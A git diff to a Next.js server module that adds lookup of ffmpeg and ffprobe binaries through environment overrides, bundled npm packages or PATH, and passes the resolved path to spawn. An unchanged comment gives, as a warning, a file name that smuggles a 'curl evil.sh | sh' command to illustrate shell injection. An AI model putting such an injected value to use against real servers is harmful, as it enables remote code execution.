@@ -1,4 +1,5 @@
 import { spawn } from "child_process";
+import { createRequire } from "module";
 import { promises as fs } from "fs";
 import os from "os";
 import path from "path";
@@ -14,6 +15,72 @@ import { NextResponse } from "next/server";
  * e.g. a file named:  song".mp3"; curl evil.sh | sh; ffmpeg -i "
  * would break out of the quotes and run as the server user.
  */
+
+/* ===================================================== */
+/* BINARY RESOLUTION                                     */
+/* ===================================================== */
+
+/**
+ * Where to find ffmpeg and ffprobe.
+ *
+ * spawn("ffmpeg") only works if the binary is on PATH, which depends entirely
+ * on the build image. That assumption broke in production: the host's builder
+ * did not read nixpacks.toml, shipped an image with Node and no ffmpeg, and
+ * every server-side tool failed while the build and deploy both reported
+ * success.
+ *
+ * Depending on the image is the fragile part, so the binaries now ship as npm
+ * dependencies (ffmpeg-static, ffprobe-static) and travel with the code —
+ * whatever the platform decides to build. Order of preference:
+ *
+ *   1. FFMPEG_PATH / FFPROBE_PATH   an explicit override for odd environments
+ *   2. the bundled npm binary        deterministic, present after npm install
+ *   3. PATH                          a system install, if there is one
+ *
+ * Resolved through createRequire rather than a static import so the bundler
+ * never tries to trace a 70 MB executable, and a package that failed to
+ * install degrades to the PATH lookup instead of crashing the module.
+ */
+const requireBinary = createRequire(import.meta.url);
+
+let cachedPaths: { ffmpeg: string; ffprobe: string } | null = null;
+
+function resolveBinaries(): { ffmpeg: string; ffprobe: string } {
+    if (cachedPaths) return cachedPaths;
+
+    let ffmpeg = process.env.FFMPEG_PATH?.trim() || "";
+    let ffprobe = process.env.FFPROBE_PATH?.trim() || "";
+
+    if (!ffmpeg) {
+        try {
+            const resolved = requireBinary("ffmpeg-static");
+            ffmpeg = typeof resolved === "string" ? resolved : resolved?.default ?? "";
+        } catch {
+            // Not installed — fall through to PATH.
+        }
+    }
+
+    if (!ffprobe) {
+        try {
+            const resolved = requireBinary("ffprobe-static");
+            ffprobe = typeof resolved?.path === "string" ? resolved.path : "";
+        } catch {
+            // Not installed — fall through to PATH.
+        }
+    }
+
+    cachedPaths = {
+        ffmpeg: ffmpeg || "ffmpeg",
+        ffprobe: ffprobe || "ffprobe",
+    };
+
+    return cachedPaths;
+}
+
+/** Exposed so the health check can report which binary it actually used. */
+export function ffmpegBinaryPath(): string {
+    return resolveBinaries().ffmpeg;
+}
 
 /* ===================================================== */
 /* LIMITS                                                */
@@ -224,7 +291,12 @@ export function runFFmpeg(
     binary: "ffmpeg" | "ffprobe" = "ffmpeg"
 ): Promise<string> {
     return new Promise((resolve, reject) => {
-        const child = spawn(binary, args, {
+        const executable =
+            binary === "ffprobe"
+                ? resolveBinaries().ffprobe
+                : resolveBinaries().ffmpeg;
+
+        const child = spawn(executable, args, {
             windowsHide: true,
             stdio: ["ignore", "pipe", "pipe"],
         });
